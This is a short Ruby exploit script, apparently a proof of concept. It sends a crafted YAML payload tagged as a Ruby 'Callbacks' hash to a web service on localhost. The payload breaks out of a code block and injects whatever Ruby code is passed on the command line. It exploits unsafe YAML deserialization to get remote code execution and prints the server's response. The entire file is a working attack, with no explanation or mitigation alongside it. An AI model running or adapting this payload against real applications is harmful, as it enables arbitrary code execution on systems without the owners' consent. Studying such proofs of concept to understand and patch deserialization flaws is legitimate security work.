#!/usr/bin/env ruby

require 'net/http'
require 'yaml'

def exploit(code)
  escaped_payload = "\nend\n#{code}\n__END__\n"

  yaml = %{
--- !ruby/hash:Callbacks
foo: #{escaped_payload.dump}
  }.strip

  return Net::HTTP.post_form(URI('http://localhost:9000/'), {'data' => yaml})
end

if $0 == __FILE__
  unless ARGV.length == 1
    $stderr.puts "usage: #{$0} CODE"
    exit -1
  end

  code = ARGV[0]

  puts "[+] Sending YAML payload containing #{code.inspect}"
  response = exploit(code)

  case response.code
  when '200' then puts "[+] #{response.body}"
  else            puts "[-] Received HTTP #{response.code}"
  end
end
